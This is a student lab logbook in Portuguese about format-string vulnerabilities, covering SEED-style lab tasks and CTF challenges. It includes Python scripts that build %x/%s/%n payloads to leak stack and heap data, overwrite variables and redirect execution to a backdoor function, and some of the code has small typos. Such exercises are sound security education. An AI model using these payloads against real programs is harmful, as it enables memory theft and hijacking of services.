# Logbook 6

O programa que vamos usar neste *lab* é o seguinte:
```
unsigned int  target = 0x11223344;
char *secret = "A secret message\n";
void myprintf(char *msg){
    // This line has a format-string vulnerability
    printf(msg);
}
int main(int argc, char **argv){
    char buf[1500];
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Input size: %d\n", length);
    myprintf(buf);
    return 1; 
}
```

## Task 1

Utilizando o ficheiro docker-compose.yml, iniciamos dois *containers* e cada um corre um servidor vulnerável. Utilizamos o servidor a correr em 10.9.0.5, que corre um programa de 32-bit com uma vulnerabilidade *format-string*.

![](https://i.imgur.com/xddv36b.png)

![](https://i.imgur.com/ZsWd53c.png)

A tarefa é fornecer um *input* para o servidor, para o programa do servidor tentar imprimir o *input* do *user* na função myprintf() e crashar. Podemos saber se o programa crashou ou não olhando para os *outputs* do *container*. 
Se myprintf() retornar, ele vai imprimir "Returned properly" e carinhas sorridentes. 
Se não observarmos isto, o programa provavelmente terá crashado. No entanto, o programa do servidor não travará; o *format program* travado é executado num processo filho gerado pelo programa do servidor.

![](https://i.imgur.com/o85dzsJ.png)

![](https://i.imgur.com/sjZRzCN.png)

## Task 2

O objetivo desta tarefa é fazer com que o servidor imprima alguns dados da memória (continuando a usar 10.9.0.5). Os dados serão impressos no lado do servidor, para que o invasor não os veja. Não é um ataque significativo, mas a técnica utilizada nesta tarefa é essencial para as tarefas subsequentes.

### Task 2.A Stack Data

O objetivo é imprimir os dados que estão na *stack* e saber o número de *format specifiers* %x que precisamos para que o programa do servidor imprima os primeiros quatro bytes do input.
Podemos colocar alguns números únicos (4 bytes) na *stack*, para sabermos quando são impressos. Este número é essencial para a maioria das tarefas subsequentes.

Usamos o seguinte código python:

```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("%x").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*64 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

```

![](https://i.imgur.com/cnsaYt2.png)

![](https://i.imgur.com/SpyxCqs.png)


### Task 2.B Heap Data

Existe uma mensagem secreta (string) armazenada na *heap area*, e conseguimos encontrar o endereço desta string na impressão do servidor. 
O objetivo é imprimir esta mensagem secreta. Para atingir este objetivo, precisamos de colocar o endereço (no formato binário) da mensagem secreta na *format string*.
A maioria dos computadores são máquinas *small-endian*, portanto, para armazenar um endereço 0xAABBCCDD (quatro bytes numa máquina de 32 bits) na memória, o byte menos significativo 0xDD é armazenado no endereço inferior, enquanto o byte mais significativo 0xAA é armazenado no endereço superior. Portanto, quando armazenamos o endereço num buffer, precisamos guardá-lo por esta ordem: 0xDD, 0xCC, 0xBB e 0xAA. 

A mensagem secreta é "A secret message"

```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  =  0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("0x080b4008").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x "*63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

![](https://i.imgur.com/1bm73Xv.png)

## Task 3

O objetivo desta tarefa é modificar o valor da variável *target*, que está definida no programa do servidor (utilizando 10.9.0.5 novamente). O valor original de *target* é 0x11223344. Supomos que esta variável tem um valor importante, que pode afetar o fluxo de controlo do programa. Se invasores remotos conseguirem alterar o valor, então poderão alterar o comportamento do programa.

### Task 3.A:

Nesta sub-tarefa temos que alterar o valor *target*, porque precisamos de alterar o conteúdo da variável para outra coisa. A tarefa é bem sucedida se pudermos alterá-la para um valor diferente, independentemente de qual valor possa ser. O endereço da variável *target* pode ser encontrado na impressão do servidor.
O nosso ficheiro exploit.py é o seguinte:
```
#!/usr/bin/python3
import sys

target_address = 0x080e5068

content = b''
content += (target_address).tobytes(4,byteorder='little')
content += b'%x'*63 + b'%n'

# Write the content to badfile
with open ('badfile', 'wb') as f:
    f.write(content)
```

Criamos uma *payload* com o endereço da variável *target* (0x080e5068), adicionamos "%x" 63 vezes e "%n" no final.

![](https://i.imgur.com/fVQtkOh.png)


### Task 3.B:

Aqui temos que alterar o valor para 0x5000, porque nesta subtarefa o objetivo é alterar o conteúdo da variável *target* para um valor específico. A tarefa é bem sucedida, somente, se o valor da variável se tornar 0x5000.

É necessário que 0x5000 caracteres sejam printed antes do %n.

Precisamos de criar a payload seguinte:
"%20476x%64$n"

```
#!/usr/bin/python3
import sys

target address = 0x080e5068

content = b'' 
content += (target_address).to_bytes(4,byteorder='little')
content += ("%20476x%64$n").encode('latin-1')

# Write the content to badfile
with open ('badfile', 'wb') as f:
    f.write(content)
```
![](https://i.imgur.com/NXHPypv.png)


# Capture The Flag

## Desafio 1

Comecemos por verificar as proteções do binário.

![](https://i.imgur.com/WMZHDoR.png)

PIE não está ativo, e assumimos também que ASLR não está ligado no servidor.
Isto garante-nos que endereços de memória que encontremos na nossa máquina serão os mesmos no servidor.

Explorando a source:

![](https://i.imgur.com/XOeex3a.png)

Vemos que a flag será loaded por load_flag() para uma variável global.

Encontrámos também uma format string vulnerability, o input do user é passado a printf diretamente:

![](https://i.imgur.com/szsgAIC.png)

Usando o gdb, encontramos facilmente o endereço da flag.

![](https://i.imgur.com/VLeHyki.png)

Passámos ao programa a string "wwww" (por ser fácil de identificar, 0x77777777), seguida de vários %p, printf vai dar print ao conteudo da próxima variável na stack sempre que ler %p.

![](https://i.imgur.com/f91F4UB.png)

O buffer está logo na primeira posição, portanto só temos de lhe passar o endereço da flag, seguido de %s.

![](https://i.imgur.com/zCA3KNP.png)

## Desafio 2

Verificamos primeiro que proteções estão ativadas no ficheiro compilado.

![](https://i.imgur.com/0K82qAM.png)

Há uma variável global, key.

![](https://i.imgur.com/4mJKL3f.png)


E se key == 0xbeef, conseguimos aceder à shell.

![](https://i.imgur.com/6UAQzcn.png)

Portanto, temos de alterar o valor de key, para isso precisamos do seu endereço em memória:

![](https://i.imgur.com/NIGNrBD.png)

A nossa payload vai ser composta por:
* JUNK (quaisquer 4 bytes que possamos usar para dar print a caractéres);
* Endereço da key;
* "%[X]x%hn".
Em que [X] = 0xbeef - 8 (length de JUNK + endereço da key).

![](https://i.imgur.com/DtD3aTT.png)

![](https://i.imgur.com/16gNTRu.png)

## FinalFormat

Novamente, corremos checksec no programa.

![](https://i.imgur.com/8sW9ydO.png)

Se usarmos objdump para listar as funções no programa:

![](https://i.imgur.com/rTHxPpx.png)

Encontramos uma função chamada old_backdoor, com o endereço 0x08049236. Descobrimos também que fflush é chamado durante o programa.

![](https://i.imgur.com/PipDKld.png)

Correndo o programa, verificamos que é vulnerável a uma format string vulnerability:

![](https://i.imgur.com/Uy4Eew7.png)

Com o código seguinte, conseguimos ver a memória na stack, x posições acima do endereço base do nosso buffer.

![](https://i.imgur.com/8fqIIfl.png)

Tentaremos substituir o endereço 0x0804c010.

A nossa payload vai ser:
* JUNK (quaisquer 4 bytes que possamos usar para dar print a caractéres);
* Endereço a alterar;
* JUNK
* Endereço a alterar + 2 (upper 2 bytes);
* "%x[X]%hn"
* "%x[Y]%hn"
Quando dermos print ao primeiro "%x", já temos 4 * 4 caractéres printed, portanto precisamos que [X] = 0x9236 - 16.
[Y] = 0x0804 - 0x9236 + 0x10000 (esta última adição compensa o overflow que estamos a forçar).

![](https://i.imgur.com/H9Dtop8.png)

![](https://i.imgur.com/glFqT9s.png)
